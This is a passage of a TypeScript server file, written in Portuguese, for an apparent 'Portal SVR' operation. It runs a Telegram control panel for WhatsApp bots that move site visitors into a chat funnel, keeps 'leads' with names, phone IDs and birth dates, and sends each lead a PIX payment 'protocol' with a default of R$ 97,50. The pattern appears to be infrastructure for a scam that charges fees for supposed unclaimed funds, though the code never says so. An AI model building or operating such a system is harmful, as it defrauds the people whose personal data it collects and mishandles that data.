            `👥 <b>Fila de Espera:</b> <b>${queue.length}</b> leads\n` +
            `🕒 <b>Hora Sistema:</b> ${now}\n\n` +
            `<b>AÇÕES DISPONÍVEIS:</b>`;

          const keyboard = {
            inline_keyboard: [
              [
                { text: "📊 Status Detalhado", callback_data: "painel:status" },
                { text: "👥 Ver Fila", callback_data: "painel:fila" }
              ],
              [
                { text: "🤖 Gestão de Perfil", callback_data: "painel:slots" },
                { text: "📡 Testar Conexão", callback_data: "cmd:ping" }
              ],
              [
                { text: "💰 Gerar PIX (Último Lead)", callback_data: "cmd:last_pix" },
                { text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }
              ]
            ]
          };

          await sendTelegram(dashboard, undefined, keyboard);
          continue;
        }

        // --- Atalho para PIX do último lead ---
        if (cb && cb.data === "cmd:last_pix") {
          try {
            if (fs.existsSync('last-lead.json')) {
              const last = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
              // Simula comando /pix com valor padrão 97.50
              await sendTelegram(`💰 <b>Iniciando fluxo PIX para:</b> <code>${last.chatId}</code>\nValor sugerido: R$ 97,50.\n\n<i>Deseja alterar o valor ou prosseguir? Envie /pix [valor] [telefone] para customizar.</i>`);
              // Redireciona para o handler de comando simulado
              text = `/pix 97.50 ${last.chatId}`;
              command = "/pix";
              // Continua o fluxo manualmente abaixo...
            } else {
              await sendTelegram("❌ Nenhum lead recente encontrado.");
              continue;
            }
          } catch (e) { continue; }
        }

        // ── Callbacks do painel interativo ──────────────────────────────
        if (cb && cb.data === "painel:status") {
          await sendPainelStatus(msg.message_id);
          continue;
        }

        if (cb && cb.data === "painel:fila") {
          await sendPainelFila(msg.message_id);
          continue;
        }

        if (cb && cb.data === "painel:leads") {
          await sendPainelLeads(msg.message_id);
          continue;
        }

        if (cb && cb.data === "painel:slots") {
          await sendPainelSlots(msg.message_id);
          continue;
        }

        if (cb && cb.data === "painel:back") {
          await sendPainelPrincipal(msg.message_id);
          continue;
        }

        if (cb && cb.data.startsWith("painel:reiniciar:")) {
          const slotId = cb.data.split(":")[2];
          const slotName = slotId === "main" ? "Perfil 1" : slotId;
          await sendTelegram(`🔄 <b>Reiniciando ${slotName}...</b>\n\nAguarde o novo QR Code nos próximos instantes.`);
          resetBotSession(slotId);
          setTimeout(() => sendPainelSlots(), 4000);
          continue;
        }

        if (cb && cb.data === "cmd:ping") {
          const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
          await sendTelegram(
            `🏓 <b>PONG! Sistema Operacional</b>\n\n` +
            `✅ Servidor respondendo normalmente\n` +
            `🕐 Hora: ${now}\n` +
            `📡 Telegram: <b>Conectado</b>\n` +
            `💾 Memória: <b>${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB</b> usados`,
            msg?.message_id
          );
          continue;
        }

        if (cb && cb.data.startsWith("etapa:")) {
          const parts = cb.data.split(":");
          const etapaNum = parseInt(parts[1]);
          const chatId = parts[2];
          const ts = Date.now();
          fs.writeFileSync(`cmd-etapa-${ts}.json`, JSON.stringify({ etapa: etapaNum, chatId }));
          await sendTelegram(`⚙️ <b>Comando enviado:</b> Liberar Etapa ${etapaNum} para <code>${chatId}</code>`, msg?.message_id);
          continue;
        }
      }
    } catch (err: any) {
      console.error("❌ [TELEGRAM] Erro no loop de polling:", err.message);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
}

// ── Funções do Painel Interativo ─────────────────────────────────────────

function getBotStatusInfo(id: string) {
  try {
    const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
    if (fs.existsSync(statusPath)) {
      const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
      const ageMs = Date.now() - (data.ts || 0);
      const ageMin = Math.floor(ageMs / 60000);
      if (data.status === 'CONNECTED') return { emoji: '🟢', label: `Online (${data.adminName || '?'})`, age: ageMin, raw: data };
      if (data.status === 'WAITING_QR') return { emoji: '🟡', label: 'Aguardando QR Code', age: ageMin, raw: data };
    }
  } catch (e) { }
  return { emoji: '⚫', label: 'Offline', age: null, raw: null };
}

function getQueueInfo() {
  try {
    const queuePath = path.join(process.cwd(), 'waiting-queue.json');
    if (fs.existsSync(queuePath)) {
      return JSON.parse(fs.readFileSync(queuePath, 'utf-8')) as any[];
    }
  } catch (e) { }
  return [];
}

function getSessionsInfo() {
  try {
    const sessFile = path.join(process.cwd(), 'sessions.json');
    if (fs.existsSync(sessFile)) {
      const raw = JSON.parse(fs.readFileSync(sessFile, 'utf-8'));
      return Object.entries(raw) as [string, any][];
    }
  } catch (e) { }
  return [];
}

async function sendPainelPrincipal(editMsgId?: number) {
  const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
  const onlineSite = Array.from(sessions.values()).filter(s => !s.converted).length;
  const queue = getQueueInfo();
  const allSessions = getSessionsInfo();
  const waitingLeads = allSessions.filter(([, v]) => v.mode === 'waiting').length;
  const botLeads = allSessions.filter(([, v]) => v.mode === 'bot').length;

  // Status do slot principal
  const mainStatus = getBotStatusInfo('main');

  const txt =
    `🏛️ <b>PAINEL DE CONTROLE — PORTAL SVR</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `📅 <b>Atualizado:</b> ${now}\n\n` +
    `<b>📊 RESUMO OPERACIONAL</b>\n` +
    `• 🌐 Visitantes no site: <b>${onlineSite}</b>\n` +
    `• 🤖 Bot WhatsApp: <b>${mainStatus.emoji} ${mainStatus.label}</b>\n` +
    `• 📋 Na fila de espera: <b>${queue.length}</b> lead(s)\n` +
    `• 💬 Em atendimento (bot): <b>${botLeads}</b>\n` +
    `• ⏳ Aguardando operador: <b>${waitingLeads}</b>\n\n` +
    `<i>Selecione uma opção abaixo:</i>`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📊 Status do Sistema', callback_data: 'painel:status' },
        { text: '📋 Fila de Espera', callback_data: 'painel:fila' }
      ],
      [
        { text: '👥 Leads Ativos', callback_data: 'painel:leads' },
        { text: '🤖 Gerenciar Slots', callback_data: 'painel:slots' }
      ],
      [
        { text: '🏓 Testar Conexão', callback_data: 'cmd:ping' }
      ]
    ]
  };

  await sendTelegram(txt, editMsgId, keyboard);
}

async function sendPainelStatus(editMsgId?: number) {
  const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
  const onlineCount = Array.from(sessions.values()).filter(s => !s.converted).length;
  const convertedCount = Array.from(sessions.values()).filter(s => s.converted).length;
  const queue = getQueueInfo();
  const allSessions = getSessionsInfo();

  let slotsInfo = '';
  for (let i = 1; i <= MAX_SLOTS; i++) {
    const id = i === 1 ? 'main' : `parceiro${i}`;
    const s = getBotStatusInfo(id);
    if (s.raw) {
      const age = s.age !== null ? ` — há ${s.age}min` : '';
      slotsInfo += `  ${s.emoji} Slot ${i}: <b>${s.label}</b>${age}\n`;
    } else {
      slotsInfo += `  ⚫ Slot ${i}: <b>Offline</b>\n`;
    }
  }

  const txt =
    `📊 <b>STATUS DETALHADO DO SISTEMA</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `🕐 <b>Hora:</b> ${now}\n\n` +
    `<b>🌐 Site (Visitantes):</b>\n` +
    `  • Ativos agora: <b>${onlineCount}</b>\n` +
    `  • Convertidos (→WA): <b>${convertedCount}</b>\n\n` +
    `<b>🤖 Slots WhatsApp:</b>\n${slotsInfo}\n` +
    `<b>📋 Fila:</b> <code>${queue.length}</code> lead(s) aguardando\n` +
    `<b>💬 Sessões WA ativas:</b> <code>${allSessions.filter(([,v]) => v.mode === 'bot').length}</code>\n\n` +
    `📱 <b>WhatsApp Master:</b> <code>${currentConfig.whatsappNumber}</code>`;

  const keyboard = {
    inline_keyboard: [
      [{ text: '🔙 Voltar ao Painel', callback_data: 'painel:back' }]
    ]
  };

  await sendTelegram(txt, editMsgId, keyboard);
}

async function sendPainelFila(editMsgId?: number) {
  const queue = getQueueInfo();

  let txt = `📋 <b>FILA DE ESPERA — PORTAL SVR</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  if (queue.length === 0) {
    txt += `✅ <i>Fila vazia no momento.</i>\n`;
  } else {
    txt += `Total: <b>${queue.length}</b> lead(s) na fila\n\n`;
    queue.slice(0, 10).forEach((lead: any, i: number) => {
      const waitMin = Math.floor((Date.now() - lead.joinedAt) / 60000);
      txt += `<b>${i + 1}.</b> ${lead.name || '?'}\n`;
      txt += `   📱 <code>${lead.chatId}</code>\n`;
      txt += `   📅 ${lead.birthDate || '?'} — ⏱ há ${waitMin}min\n\n`;
    });
    if (queue.length > 10) txt += `<i>... e mais ${queue.length - 10} lead(s)</i>\n`;
  }

  const keyboard = {
    inline_keyboard: [
      [{ text: '🔙 Voltar ao Painel', callback_data: 'painel:back' }]
    ]
  };

  await sendTelegram(txt, editMsgId, keyboard);
}

async function sendPainelLeads(editMsgId?: number) {
  const allSessions = getSessionsInfo();
  const botLeads = allSessions.filter(([, v]) => v.mode === 'bot');
  const waitingLeads = allSessions.filter(([, v]) => v.mode === 'waiting');
  const humanLeads = allSessions.filter(([, v]) => v.mode === 'human');

  let txt = `👥 <b>LEADS ATIVOS — PORTAL SVR</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  txt += `🤖 <b>Em atendimento pelo bot (${botLeads.length}):</b>\n`;
  if (botLeads.length === 0) {
    txt += `  <i>Nenhum no momento.</i>\n`;
  } else {
    botLeads.slice(0, 5).forEach(([chatId, v]) => {
      const step = v.step === 1 ? '📅 Aguard. data' : v.step === 2 ? '👤 Aguard. nome' : '✅ Cadastrando';
      txt += `  • <code>${chatId}</code> — ${step}\n`;
    });
  }

  txt += `\n⏳ <b>Aguardando operador (${waitingLeads.length}):</b>\n`;
  if (waitingLeads.length === 0) {
    txt += `  <i>Nenhum no momento.</i>\n`;
  } else {
    waitingLeads.slice(0, 5).forEach(([chatId, v]) => {
      txt += `  • <code>${chatId}</code> — ${v.name || '?'}\n`;
    });
  }

  txt += `\n👤 <b>Atendimento humano (${humanLeads.length}):</b>\n`;
  if (humanLeads.length === 0) {
    txt += `  <i>Nenhum no momento.</i>\n`;
  } else {
    humanLeads.slice(0, 5).forEach(([chatId]) => {
      txt += `  • <code>${chatId}</code>\n`;
    });
  }

  txt += `\n<i>💡 Use /pix [valor] para enviar protocolo ao último lead.</i>`;

  const keyboard = {
    inline_keyboard: [
      [{ text: '🔙 Voltar ao Painel', callback_data: 'painel:back' }]
    ]
  };

  await sendTelegram(txt, editMsgId, keyboard);
}

async function sendPainelSlots(editMsgId?: number) {
  let txt = `🤖 <b>GERENCIAMENTO DE SLOTS WHATSAPP</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

  const slotButtons: any[][] = [];

  for (let i = 1; i <= MAX_SLOTS; i++) {
    const id = i === 1 ? 'main' : `parceiro${i}`;
    const s = getBotStatusInfo(id);
    const age = s.age !== null ? ` (há ${s.age}min)` : '';
    txt += `${s.emoji} <b>Slot ${i}:</b> ${s.label}${age}\n`;

    slotButtons.push([
      { text: `🔄 Reiniciar Slot ${i}`, callback_data: `painel:reiniciar:${id}` }
    ]);
  }

  txt += `\n<i>Clique para reiniciar e gerar novo QR Code.</i>`;

  const keyboard = {
    inline_keyboard: [
      ...slotButtons,
      [{ text: '🔙 Voltar ao Painel', callback_data: 'painel:back' }]
    ]
  };

  await sendTelegram(txt, editMsgId, keyboard);
}

app.get('*', (req, res) => {
  const distPath = path.join(process.cwd(), 'dist', 'index.html');
  if (fs.existsSync(distPath)) res.sendFile(distPath);
  else res.status(404).send('Frontend não compilado.');
});

function mask(str: string | undefined) {
  if (!str) return "NÃO CONFIGURADO";
  return str.substring(0, 6) + "..." + str.substring(str.length - 4);
}

app.listen(Number(port), "0.0.0.0", () => {
  console.log(`\n🚀 [SVR SYSTEM] ONLINE - Porta ${port}`);
  console.log(`---------------------------------------------`);
  console.log(`📡 CORE_URL: ${process.env.SVR_SYS_CORE_URL}`);
  console.log(`🤖 TG_TOKEN: ${mask(process.env.TELEGRAM_BOT_TOKEN)}`);
  console.log(`💬 CHAT_ID:  ${mask(process.env.TELEGRAM_CHAT_ID)}`);
  console.log(`💰 GATEWAY:  ${process.env.SVR_CORE_GATEWAY}`);
  console.log(`---------------------------------------------\n`);
  
  startTelegramPolling();
  startBot(); // Inicia o bot WhatsApp principal automaticamente
});

